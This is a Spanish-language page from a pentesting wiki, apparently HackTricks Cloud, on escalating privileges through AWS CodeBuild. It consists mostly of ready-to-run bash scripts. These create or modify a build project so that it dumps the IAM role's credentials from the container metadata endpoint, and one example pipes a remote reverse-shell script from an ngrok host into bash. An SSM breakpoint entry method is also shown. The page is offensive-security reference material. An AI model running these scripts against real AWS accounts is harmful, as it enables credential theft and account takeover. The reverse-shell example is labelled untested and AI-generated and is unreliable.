# AWS - Codebuild Privesc

<details>

<summary><strong>¡Apoya a HackTricks y obtén beneficios!</strong></summary>

* Si quieres ver a tu **empresa anunciada en HackTricks** o si quieres acceder a la **última versión de PEASS o descargar HackTricks en PDF** ¡Consulta los [**PLANES DE SUSCRIPCIÓN**](https://github.com/sponsors/carlospolop)!
* Obtén el [**swag oficial de PEASS y HackTricks**](https://peass.creator-spring.com)
* Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colección de exclusivos [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Únete al** 💬 [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **sígueme** en **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm).

* **Comparte tus trucos de hacking enviando PRs a los repositorios de github de** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

## codebuild

### `iam:PassRole`, `codebuild:CreateProject`, (`codebuild:StartBuild` | `codebuild:StartBuildBatch`)

Un atacante con los permisos **`iam:PassRole`, `codebuild:CreateProject` y `codebuild:StartBuild` o `codebuild:StartBuildBatch`** podría **escalar privilegios a cualquier rol de IAM de codebuild** creando uno en ejecución.

{% tabs %}
{% tab title="Ejemplo1" %}
```bash
REV="env\\\\n      - curl http://169.254.170.2\$AWS_CONTAINER_CREDENTIALS_RELATIVE_URI"

JSON="{
    \"name\": \"codebuild-demo-project\",
    \"source\": {
        \"type\": \"NO_SOURCE\",
        \"buildspec\": \"version: 0.2\\\\n\\\\nphases:\\\\n  build:\\\\n    commands:\\\\n      - $REV\\\\n\"
    },
    \"artifacts\": {
        \"type\": \"NO_ARTIFACTS\"
    },
    \"environment\": {
        \"type\": \"LINUX_CONTAINER\",
        \"image\": \"aws/codebuild/standard:1.0\",
        \"computeType\": \"BUILD_GENERAL1_SMALL\"
    },
    \"serviceRole\": \"arn:aws:iam::947247140022:role/service-role/codebuild-CI-Build-service-role-2\"
}"


REV_PATH="/tmp/rev.json"

printf "$JSON" > $REV_PATH

# Crear proyecto
aws codebuild create-project --cli-input-json file://$REV_PATH

# Compilarlo
aws codebuild start-build --project-name codebuild-demo-project

# Esperar 3-4 minutos hasta que se ejecute
# Luego se pueden acceder a los registros en la consola para encontrar el token del rol de AWS en la salida

# Eliminar el proyecto
aws codebuild delete-project --name codebuild-demo-project
```
{% endtab %}

{% tab title="Ejemplo2" %}
{% code overflow="wrap" %}
```bash
# Generado por IA, no probado
# Crear un archivo buildspec.yml con el comando de shell inverso
echo 'version: 0.2
phases:
  build:
    commands:
      - curl https://reverse-shell.sh/2.tcp.ngrok.io:14510 | bash' > buildspec.yml

# Crear un nuevo proyecto CodeBuild con el archivo buildspec.yml
aws codebuild create-project --name reverse-shell-project --source type=S3,location=<S3_BUCKET_NAME>/buildspec.yml --artifacts type=NO_ARTIFACTS --environment computeType=BUILD_GENERAL1_SMALL,image=aws/codebuild/standard:5.0,type=LINUX_CONTAINER --service-role <YOUR_HIGH_PRIVILEGE_ROLE_ARN> --timeout-in-minutes 60

# Iniciar una compilación con el nuevo proyecto
aws codebuild start-build --project-name reverse-shell-project

```
{% endcode %}
{% endtab %}
{% endtabs %}

**Impacto potencial:** Privesc directo a cualquier rol de AWS codebuild.

{% hint style="warning" %}
En un **contenedor Codebuild** el archivo `/codebuild/output/tmp/env.sh` contiene todas las variables de entorno necesarias para acceder a las **credenciales de metadatos**.

Este archivo contiene la **variable de entorno `AWS_CONTAINER_CREDENTIALS_RELATIVE_URI`** que contiene la **ruta de URL** para acceder a las credenciales. Será algo como esto `/v2/credentials/2817702c-efcf-4485-9730-8e54303ec420`

Agrega eso a la URL **`http://169.254.170.2/`** y podrás volcar las credenciales del rol.

Además, también contiene la **variable de entorno `ECS_CONTAINER_METADATA_URI`** que contiene la URL completa para obtener **información de metadatos sobre el contenedor**.
{% endhint %}

### `iam:PassRole`, `codebuild:UpdateProject`, (`codebuild:StartBuild` | `codebuild:StartBuildBatch`)

Al igual que en la sección anterior, si en lugar de crear un proyecto de compilación se puede modificar, se puede indicar el rol de IAM y robar el token.

```bash
REV="env\\\\n      - curl http://169.254.170.2\$AWS_CONTAINER_CREDENTIALS_RELATIVE_URI"

# Necesitas indicar el nombre del proyecto que deseas modificar
JSON="{
    \"name\": \"<codebuild-demo-project>\",
    \"source\": {
        \"type\": \"NO_SOURCE\",
        \"buildspec\": \"version: 0.2\\\\n\\\\nphases:\\\\n  build:\\\\n    commands:\\\\n      - $REV\\\\n\"
    },
    \"artifacts\": {
        \"type\": \"NO_ARTIFACTS\"
    },
    \"environment\": {
        \"type\": \"LINUX_CONTAINER\",
        \"image\": \"aws/codebuild/standard:1.0\",
        \"computeType\": \"BUILD_GENERAL1_SMALL\"
    },
    \"serviceRole\": \"arn:aws:iam::947247140022:role/service-role/codebuild-CI-Build-service-role-2\"
}"

printf "$JSON" > $REV_PATH

aws codebuild update-project --cli-input-json file://$REV_PATH

aws codebuild start-build --project-name codebuild-demo-project
```

**Impacto potencial:** Privesc directo a cualquier rol de AWS codebuild.

### ssm

Teniendo **suficientes permisos para iniciar una sesión de ssm** es posible **entrar en un proyecto Codebuild** que se está construyendo.

El proyecto de codebuild necesitará tener un punto de interrupción:

<pre class="language-yaml"><code class="lang-yaml">phases:
  pre_build:
    commands:
      - echo Entered the pre_build phase...
      - echo "Hello World" > /tmp/hello-world
<strong>      - codebuild-breakpoint
</strong></code></pre>

Y luego:

```bash
aws codebuild batch-get-builds --ids <buildID> --region <region> --output json
aws ssm start-session --target <sessionTarget> --region <region>
```

Para obtener más información, [**consulte la documentación**](https://docs.aws.amazon.com/codebuild/latest/userguide/session-manager.html).

<details>

<summary><strong>¡Apoya a HackTricks y obtén beneficios!</strong></summary>

* Si quieres ver a tu **empresa anunciada en HackTricks** o si quieres acceder a la **última versión de PEASS o descargar HackTricks en PDF** ¡Consulta los [**PLANES DE SUSCRIPCIÓN**](https://github.com/sponsors/carlospolop)!
* Obtén el [**swag oficial de PEASS y HackTricks**](https://peass.creator-spring.com)
* Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colección de exclusivos [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Únete al** 💬 [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **sígueme** en **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm).

* **Comparte tus trucos de hacking enviando PRs a los repositorios de github de** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>